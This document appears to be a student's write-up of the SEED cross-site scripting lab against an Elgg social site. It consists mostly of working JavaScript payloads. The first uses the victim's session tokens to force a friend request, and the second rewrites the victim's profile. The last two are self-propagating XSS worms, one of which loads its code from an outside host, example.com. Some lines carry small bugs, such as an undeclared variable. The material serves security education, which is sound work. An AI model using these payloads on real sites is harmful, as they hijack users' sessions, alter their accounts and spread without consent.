# Cross-Site Scripting (XSS) Attack Lab

## Fei Guo, Jul 16

### Becoming the Victim’s Friend

This script, added to Samy's profile page, will add Samy as a friend to anyone who views Samy's profile.

<script type="text/javascript">
window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token; //Construct the HTTP request to add Samy as a friend.
var sendurl= "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;  //FILL IN
//Create and send Ajax request to add friend
  Ajax=new XMLHttpRequest();
  Ajax.open("GET", sendurl, true);
  Ajax.send();
} </script>


### Modifying the Victim’s Profile

This script will modify viewers' profile if they view Samy's page.

<script type="text/javascript">
window.onload = function(){
  //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
  //and Security Token __elgg_token
  var userName="&name="+elgg.session.user.name;
  var guid="&guid="+elgg.session.user.guid;
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token;
  //Construct the content of your url.
  var priv = "&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2"  
  var desc = "&description=" + escape("Samy is my hero");
  var content= token + ts + name + desc + priv + guid;
  var samyGuid= 57;
  var sendurl= "http://www.seed-server.com/action/profile/edit";

  if(elgg.session.user.guid!=samyGuid) {
     //Create and send Ajax request to modify profile
     var Ajax=null;
     Ajax=new XMLHttpRequest();
     Ajax.open("POST", sendurl, true);
  Ajax.setRequestHeader("Content-Type",
                             "application/x-www-form-urlencoded");
     Ajax.send(content);
  }
}
</script>

### Writing a Self-Propagating XSS Worm

#### The Link Approach:

We simply write this line to attackers' profile:

<script type="text/javascript" src="http://www.example.com/xss_worm.js">
</script>

And add the following into http://www.example.com/xss_worm.js:

<script type="text/javascript">
window.onload = function(){
  //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
  //and Security Token __elgg_token
  var userName="&name="+elgg.session.user.name;
  var guid="&guid="+elgg.session.user.guid;
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token;
  //Construct the content of your url.
  var priv = "&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2"  
  var desc = "&description=" + escape("Samy is my hero.  <script type='text/javascript' src='http://www.example.com/xss_worm.js'>") + "</" + "script>";
  var content= token + ts + name + desc + priv + guid;
  var samyGuid= 57;
  var sendurl= "http://www.seed-server.com/action/profile/edit";

  if(elgg.session.user.guid!=samyGuid) {
     //Create and send Ajax request to modify profile
     var Ajax=null;
     Ajax=new XMLHttpRequest();
     Ajax.open("POST", sendurl, true);
  Ajax.setRequestHeader("Content-Type",
                             "application/x-www-form-urlencoded");
     Ajax.send(content);
  }
}
</script>

#### The DOM Approach

This one is fancier because it will "output" the same piece of code as itself, a.k.a, "self-producing" code.

<script id="worm">
  window.onload = function(){
  var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
  var jsCode = document.getElementById("worm").innerHTML; 
  var tailTag = "</" + "script>";
  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

  //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
  //and Security Token __elgg_token
  var userName="&name="+elgg.session.user.name;
  var guid="&guid="+elgg.session.user.guid;
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token;
  //Construct the content of your url.
  var priv = "&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2"  
  var desc = "&description=" + wormCode;
  var content= token + ts + name + desc + priv + guid;
  var samyGuid= 57;
  var sendurl= "http://www.seed-server.com/action/profile/edit";

  if(elgg.session.user.guid!=samyGuid) {
     //Create and send Ajax request to modify profile
     var Ajax=null;
     Ajax=new XMLHttpRequest();
     Ajax.open("POST", sendurl, true);
     Ajax.setRequestHeader("Content-Type",
                             "application/x-www-form-urlencoded");
     Ajax.send(content);
  }
}


</script>

